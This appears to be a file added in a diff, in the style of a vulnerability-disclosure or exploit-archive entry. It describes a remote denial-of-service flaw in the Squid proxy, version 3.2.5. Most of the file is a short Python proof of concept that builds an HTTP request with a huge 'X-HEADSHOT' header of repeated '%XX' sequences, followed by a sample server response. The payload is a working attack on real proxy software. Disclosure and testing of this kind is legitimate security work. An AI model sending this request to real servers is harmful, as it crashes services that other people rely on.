@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/58319/info
+
+Squid is prone to a remote denial-of-service vulnerability.
+
+Attackers can exploit this issue to crash the application, resulting in denial-of-service conditions.
+
+Squid 3.2.5 is vulnerable; other versions may also be affected. 
+
+Request
+  -- cut --
+  #!/usr/bin/env python
+  print 'GET /index.html HTTP/1.1'
+  print 'Host: localhost'
+  print 'X-HEADSHOT: ' + '%XX' * 19000
+  print '\r\n\r\n'
+  -- cut --
+
+  Response
+  -- cut --
+  HTTP/1.1 200 OK
+  Vary: X-HEADSHOT
+  -- cut --
